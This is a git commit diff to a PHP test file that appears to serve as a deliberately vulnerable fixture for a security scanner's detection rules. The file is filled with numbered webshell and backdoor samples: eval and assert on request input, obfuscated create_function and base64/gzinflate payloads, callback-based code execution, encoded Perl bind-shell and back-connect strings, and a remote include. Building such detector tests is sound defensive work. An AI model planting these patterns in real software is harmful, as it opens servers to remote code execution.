8f5c8aae9653f3153944ba2abc268b290f7d1239
braveghz <braveghz@gmail.com>
2017-09-11 11:54:49 +0800

    improve rules

--- tests/vulnerabilities/v.php
+++ tests/vulnerabilities/v.php
@@ -8,16 +8,13 @@ $target = "10.11.2.220";
 $cmd = $_REQUEST['a'];
 
 echo ($callback . ";");
-echo $callback;
 
 extract($cmd);
-
-@array_map("ass\x65rt", (array) @$cmd);
+eval($cmd);
 
 $cmd = $_GET['cmd'];
 
 if (!empty($cmd)) {
-	eval($cmd);
 	system('ls'+$cmd);
 }
 
@@ -55,8 +52,6 @@ $url = $_GET["url"];
 if (!empty($url)) {
 	echo get_headers($url, 1);
 }
-
-print("Hello " . $cmd);
 
 $query = "SELECT id, name, inserted, size FROM products WHERE size = '$size' ORDER BY $order LIMIT $limit, $offset;";
 mysql_query($query);
@@ -100,12 +95,10 @@ if (!empty($file)) {
 	unlink($file);
 }
 
-header("Location: " . $_GET["url"]);
-
 $host = $_POST['host'];
 $port = $_POST['port'];
 function GetFile($host, $port, $link) {
-	$fp = fsockopen($host, intval($port), $errno, $errstr, 30);
+    $fp = fsockopen($host, intval($port), $errno, $errstr, 30);
 	if (!$fp) {
 		echo "$errstr (error number $errno) \n";
 	} else {
@@ -153,10 +146,6 @@ echo @preg_replace('/xx/e', $_POST[sss], axxa);
 //cvi-360006
 ($code = $_POST['code']) && @preg_replace('/ad/e', '@' . str_rot13('riny') .'($code)', 'add');
 
-//cvi-360007
-//call_user_func('assert', $_REQUEST['pass']); //这种和参数可控重复  同理加密的字符串检测不出来
-//call_user_func('assert', $arr);
-
 //cvi-360008
 $a = 'assert';
 call_user_func($a, $arr);
@@ -177,21 +166,13 @@ $stmt->execute();
 $sa = create_function('xxx', "eval()");$sa();
 
 //cvi-360012
-$func=@create_function('$x','ev'.'al'.'(gz'.'inf'.'late'.'(bas'.'e64'.'_de'.'co'.'de($x)));');$func($_GET['func']);
+$func=@create_function('$x','ev'.'al'.'(gz'.'inf'.'late'.'(bas'.'e64'.'_de'.'co'.'de($x)));'); $func($_GET['func']);
 
 //cvi-360013
-//$id = $_GET['id'];$q = 'echo' . $id . 'is' . $a . ";";$sy = create_function('$a', $q);
 $sa = "eval()"; create_function('xxx', $sa);
 
 //cvi-360014
 $a = "eval";$a($_GET['a']);
-
-//cvi-360015 感觉有误报的
-if ($dbhandle = sqlite_open('mysqlitedb', 0666, $sqliteerror)) {
-	sqlite_create_function($dbhandle, 'func', 'eval($cmd);', 1);
-} else {
-	echo 'Error opening sqlite db: ' . $sqliteerror;exit;
-}
 
 //cvi-360016
 filter_var_array(array('test' => $_REQUEST['pass']), array('test' => array('filter' => FILTER_CALLBACK, 'options' => 'assert')));
@@ -217,6 +198,9 @@ $a = "ZXZhbA==";array_walk($array, base64_decode($a));
 ini_set('allow_url_include, 1'); // Allow url inclusion in this script
 include 'php://input';
 
+//cvi-360027
+assert($_SERVER["REQUEST_URI"]);
+
 //cvi-360026
 $cb = 'system';
 ob_start($cb);
@@ -227,8 +211,20 @@ ob_end_flush();
 eval(base64_decode(
 ZXZhbChiYXNlNjRfZGVjb2RlKFpYWmhiQ2hpWVhObE5qUmZaR1ZqYjJSbEtFeDVPRGhRTTBKdlkwRndiR1J0Um5OTFExSm1WVVU1VkZaR2RHdGlNamw1V0ZOclMweDVPQzVqYUhJb05EY3BMbEJuS1NrNykpOw));
 
-//cvi-360032
-//<div class = bartitle><h4> '.sh_name().' </h4>  .:r57 . bizDq99Shell:.</div>
+//cvi-360029
+$bind_pl = "IyEvdXNyL2Jpbi9lbnYgcGVybA0KJFNIRUxMPSIvYmluL2Jhc2ggLWkiOw0KaWYgKEBBUkdWIDwg...";
+
+//cvi-360030
+$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU2...";
+
+//cvi-360031
+function zWM($NXlKO){
+    $NXlKO=gzuncompress(base64_decode($NXlKO));
+    for($i=0;$i<strlen($NXlKO);$i++){
+        $NXlKO[$i] = chr(ord($NXlKO[$i])-1);
+    }
+    return $NXlKO;
+}
 
 //cvi-360033
 $shver = "Emp3ror Undetectable #18"; //Current version
@@ -249,3 +245,7 @@ echo $func->invokeArgs(array($_GET[c], $_GET[id]));
 $a = 'assert';
 $arr = new ArrayObject(array('test', $_REQUEST['pass']));
 $arr->uasort($a);
+
+//cvi-360037
+$a="http://www.test.com/sss.php";
+require_once $a;
